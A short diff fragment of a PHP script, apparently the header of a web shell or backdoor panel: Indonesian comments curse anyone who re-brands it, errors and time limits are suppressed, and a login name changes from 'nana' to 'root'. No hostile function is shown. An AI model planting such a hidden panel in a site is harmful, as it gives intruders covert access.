@@ -2,8 +2,8 @@
 /* Gw doain kalo lu recode tytyd lu jadi kecil */
 set_time_limit(0);
 error_reporting(0);
-
-$name = "nana";
+/* Ini bisa di ganti sesuai kemauan kalian */
+$name = "root";
 @session_start();
 function login()
 	{
